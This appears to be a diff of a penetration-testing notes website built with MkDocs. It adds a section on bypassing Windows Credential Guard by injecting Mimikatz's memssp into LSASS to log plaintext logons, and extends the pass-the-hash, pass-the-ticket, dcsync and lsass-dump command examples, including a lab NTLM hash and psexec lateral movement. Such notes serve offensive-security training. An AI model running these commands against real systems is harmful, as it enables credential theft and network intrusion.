@@ -4130,6 +4130,56 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#evading-windows-credential-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evading Windows Credential Guard
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evading Windows Credential Guard">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-windows-credential-guard-and-how-it-protects-password-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What is Windows Credential Guard and how it protects password dumping
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-workaround-for-windows-credential-guard-abusing-security-support-provider-interfaces-sspi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The workaround for Windows Credential Guard: abusing Security Support Provider Interfaces (SSPI)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypassing-windows-credential-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypassing Windows Credential Guard
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -27968,6 +28018,56 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#evading-windows-credential-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evading Windows Credential Guard
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evading Windows Credential Guard">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-windows-credential-guard-and-how-it-protects-password-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What is Windows Credential Guard and how it protects password dumping
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-workaround-for-windows-credential-guard-abusing-security-support-provider-interfaces-sspi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The workaround for Windows Credential Guard: abusing Security Support Provider Interfaces (SSPI)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypassing-windows-credential-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypassing Windows Credential Guard
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -28030,7 +28130,11 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-0-29">29</a></span>
 <span class="normal"><a href="#__codelineno-0-30">30</a></span>
 <span class="normal"><a href="#__codelineno-0-31">31</a></span>
-<span class="normal"><a href="#__codelineno-0-32">32</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c1"># Impersonate as NT Authority/SYSTEM (having permissions for it).</span>
+<span class="normal"><a href="#__codelineno-0-32">32</a></span>
+<span class="normal"><a href="#__codelineno-0-33">33</a></span>
+<span class="normal"><a href="#__codelineno-0-34">34</a></span>
+<span class="normal"><a href="#__codelineno-0-35">35</a></span>
+<span class="normal"><a href="#__codelineno-0-36">36</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c1"># Impersonate as NT Authority/SYSTEM (having permissions for it).</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>token::elevate
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="c1"># List users and hashes of the machine</span>
@@ -28047,31 +28151,38 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a>mimikatz.exe<span class="w"> </span>privilege::debug<span class="w"> </span><span class="s2">&quot;sekurlsa::pth /user:&lt;username&gt; /rc4:&lt;NTLM hash&gt; /domain:&lt;DOMAIN&gt; /run:&lt;Command&gt;&quot;</span><span class="w"> </span><span class="nb">exit</span>
 </span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="c1"># sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user&#39;s password</span>
 </span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="c1"># /run:&lt;Command&gt;: For example /run:cmd.exe</span>
-</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18"></a><span class="c1"># 2. After that, we canuse cmd.exe to execute commands in the user&#39;s context. </span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18"></a><span class="c1"># 2. After that, we can use cmd.exe to execute commands in the user&#39;s context. </span>
 </span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a>
-</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20"></a><span class="c1"># Run a dcsync attack:</span>
-</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21"></a>.<span class="se">\m</span>imikatz.exe<span class="w"> </span>privilege::debug<span class="w"> </span><span class="s2">&quot;lsadump::dcsync /domain:</span><span class="nv">$domain</span><span class="s2"> /user:Administrator&quot;</span><span class="w"> </span><span class="nb">exit</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20"></a><span class="c1"># Example for Pass The Hash attack in windows:</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21"></a>mimikatz.exe<span class="w"> </span>sekurlsa::pth<span class="w"> </span>/domain:htb.local<span class="w"> </span>/user:jackie.may<span class="w"> </span>/rc4:ad11e823e1638def97afa7cb08156a94<span class="w"> </span>/run:cmd.exe
 </span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22"></a>
-</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23"></a><span class="c1">#####</span>
-</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24"></a><span class="c1"># Analyze a lsaass dump file:</span>
-</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25"></a><span class="c1">#####</span>
-</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26"></a><span class="c1"># Using &#39;mimikatz.log&#39; for logfile</span>
-</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27"></a>mimikatz<span class="w"> </span><span class="c1"># log</span>
-</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28"></a><span class="c1"># Switch to MINIDUMP : &#39;lsass.dmp&#39;</span>
-</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29"></a>mimikatz<span class="w"> </span><span class="c1"># sekurlsa::minidump lsass.dmp</span>
-</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30"></a><span class="c1"># Opening : &#39;lsass.dmp&#39; file for minidump...</span>
-</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31"></a>mimikatz<span class="w"> </span><span class="c1"># sekurlsa::logonpasswords</span>
-</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32"></a><span class="c1">###########</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23"></a>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24"></a><span class="c1"># Run a dcsync attack:</span>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25"></a>.<span class="se">\m</span>imikatz.exe<span class="w"> </span>privilege::debug<span class="w"> </span><span class="s2">&quot;lsadump::dcsync /domain:</span><span class="nv">$domain</span><span class="s2"> /user:Administrator&quot;</span><span class="w"> </span><span class="nb">exit</span>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26"></a>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27"></a><span class="c1">#####</span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28"></a><span class="c1"># Analyze a lsaass dump file:</span>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29"></a><span class="c1">#####</span>
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30"></a><span class="c1"># Using &#39;mimikatz.log&#39; for logfile</span>
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31"></a>mimikatz<span class="w"> </span><span class="c1"># log</span>
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32"></a><span class="c1"># Switch to MINIDUMP : &#39;lsass.dmp&#39;</span>
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33"></a>mimikatz<span class="w"> </span><span class="c1"># sekurlsa::minidump lsass.dmp</span>
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34"></a><span class="c1"># Opening : &#39;lsass.dmp&#39; file for minidump...</span>
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35"></a>mimikatz<span class="w"> </span><span class="c1"># sekurlsa::logonpasswords</span>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36"></a><span class="c1">###########</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="passtheticket-attack">PassTheTicket attack</h2>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
-<span class="normal"><a href="#__codelineno-1-2">2</a></span>
-<span class="normal"><a href="#__codelineno-1-3">3</a></span>
-<span class="normal"><a href="#__codelineno-1-4">4</a></span>
-<span class="normal"><a href="#__codelineno-1-5">5</a></span>
-<span class="normal"><a href="#__codelineno-1-6">6</a></span>
-<span class="normal"><a href="#__codelineno-1-7">7</a></span>
-<span class="normal"><a href="#__codelineno-1-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a># Export the tickets existing in machine1 so they can be used 
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a># Export the tickets existing in machine1 so they can be used 
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>sekurlsa::tickets /export
 </span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>
 </span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a># That will generate a lot of tickets. To pass the ticket to our context
@@ -28079,6 +28190,9 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>
 </span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a># Now the ticket is loaded in our machine 1. We can now do a dir on machine2
 </span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>dir \\machine2\c$
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a># Or 
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a>psexec \\machine2 cmd.exe
 </span></code></pre></div></td></tr></table></div>
 <h2 id="an-example">An Example</h2>
 <p><strong>1.</strong> Enumerating SPNs with setspn.exe</p>
@@ -28142,10 +28256,44 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="go">hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt </span>
 </span></code></pre></div></td></tr></table></div>
 <p>If we decide to skip the base64 output with Mimikatz and type <code>mimikatz # kerberos::list /export</code>, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run <code>kirbi2john.py</code> against them directly, skipping the base64 decoding step.</p>
+<h2 id="evading-windows-credential-guard">Evading Windows Credential Guard</h2>
+<h3 id="what-is-windows-credential-guard-and-how-it-protects-password-dumping">What is Windows Credential Guard and how it protects password dumping</h3>
+<p>Unlike local account hashes which are stored in the SAM, credential information such as domain hashes are stored in the memory of the <strong>lsass.exe</strong> process. Fortunately, <em>Mimikatz</em> can locate these stored credentials for us.  Because of this Microsoft has introduced several mitigations to attempt to combat this.</p>
+<p>When Windows Credential Guard is enabled (check with Get-ComputerInfo), the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named  LSAISO.exe (LSA Isolated) and communicates with the <strong>LSASS.exe</strong> process running in VTL0 through an RCP channel.</p>
+<blockquote>
+<p><a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs"><em>Virtualization-based Security (VBS)</em></a> is a software technology which creates and isolates secure regions of memory which become the <em>root of trust</em> of the operating system. VBS runs a <a href="https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor"><em>hypervisor</em></a> on the physical hardware rather than running on the operating system. Specifically, VBS is implemented through <a href="https://en.wikipedia.org/wiki/Hyper-V"><em>Hyper-V</em></a>, Microsoft's native hypervisor. In addition, Microsoft built the <a href="https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm"><em>Virtual Secure Mode</em></a> (VSM) which is a set of hypervisor capabilities offered to the Hyper-V partitions. VSM maintains this isolation through what is known as <a href="https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_OffensiveCon/2019_02%20-%20OffensiveCon%20-%20Growing%20Hypervisor%200day%20with%20Hyperseed.pdf"><em>Virtual Trust Levels</em></a> (VTLs). Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on. As of the writing of this module Windows uses two VTLs:</p>
+<ul>
+<li><em>VTL0</em> (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (<em>nt</em>) and kernel-mode data.</li>
+<li><em>VTL1</em> (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.</li>
+</ul>
+<p>The user-mode in VTL1 is known as <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes"><em>Isolated User-Mode (IUM)</em></a>, which consists of IUM processes known as <em>Trusted Processes</em>, <em>Secure Processes</em>, or <em>Trustlets</em>.</p>
+<p>Microsoft has used VSM as a base for several mitigations including <em>Device Guard</em>, <em>virtual TPMs</em> and <em>Credential Guard</em>.</p>
+</blockquote>
+<p>In this Module, we'll focus on <a href="https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works"><em>Credential Guard</em></a> mitigation. When enabled, the <em>Local Security Authority (LSASS)</em> environment runs as a trustlet in VTL1 named <em>LSAISO.exe (LSA Isolated)</em> and communicates with the <strong>LSASS.exe</strong> process running in VTL0 through an RCP channel.</p>
+<p>Mimikatz can peruse the memory of the LSASS process and retrieve cached hashes, credentials and information. With the new process running in VTL1, all the cached hashes and credential information is stored there, rather than in the memory of the LSASS process, meaning we can't access it.</p>
+<h3 id="the-workaround-for-windows-credential-guard-abusing-security-support-provider-interfaces-sspi">The workaround for Windows Credential Guard: abusing Security Support Provider Interfaces (SSPI)</h3>
+<p>Given that we can't retrieve cached hashes and credentials, we must change our focus. Instead of trying to get this information after a user has already logged into the box, we could attempt to intercept the credentials while a user is logging in.</p>
+<p>Microsoft provides quite a few <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024(v=ws.10)"><em>authentication mechanisms</em></a> as part of the Windows operating system such as <em>Local Security Authority (LSA) Authentication</em>, <em>Winlogon</em>, <em>Security Support Provider Interfaces (SSPI)</em>, etc.</p>
+<p>Specifically, SSPI is foundational as it is used by all applications and services that require authentication. By default, Windows provides several <em>Security Support Providers (SSP)</em> such as <em>Kerberos Security Support Provider</em>, <em>NTLM Security Support Provider</em>, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.</p>
+<p>Additionally the SSP can also be registered through the <em>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages</em> registry key. Each time the system starts up, the <em>Local Security Authority</em> (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.</p>
+<p>What this means is that if we were to develop our own SSP and register it with <em>LSASS</em>, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.</p>
+<p>Fortunately, Mimikatz already supports this through the <a href="https://tools.thehacker.recipes/mimikatz/modules/misc/memssp"><em>memssp</em></a>, which not only provides the required Security Support Provider (SSP) functionality but injects it directly into the memory of the <strong>lsass.exe</strong> process without dropping any DLLs on disk.</p>
+<p>The Mimikatz SSP takes advantage of the fact that a SSP is called with plaintext credentials through the SSPI allowing us to intercept them directly without needing to resort to a hash.</p>
+<h3 id="bypassing-windows-credential-guard">Bypassing Windows Credential Guard</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span>
+<span class="normal"><a href="#__codelineno-11-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>mimikatz.exe
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>privilege::debug
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a>misc::memssp
+</span></code></pre></div></td></tr></table></div>
+<p>When injecting a SSP into <em>LSASS</em> using Mimikatz, the credentials will be saved in a log file, <strong>C:\Windows\System32\mimilsa.log</strong>.</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="nb">type</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\m</span>imilsa.log
+</span></code></pre></div></td></tr></table></div>
+<p>At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="January 24, 2026 18:03:47 UTC"><span class="timeago" datetime="2026-01-24T18:03:47+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="January 24, 2026 18:03:47 UTC">2026-01-24</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="January 25, 2026 14:34:21 UTC"><span class="timeago" datetime="2026-01-25T14:34:21+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="January 25, 2026 14:34:21 UTC">2026-01-25</span></small></br>
 
 
     <small>Created: July 12, 2023 19:45:03</small>
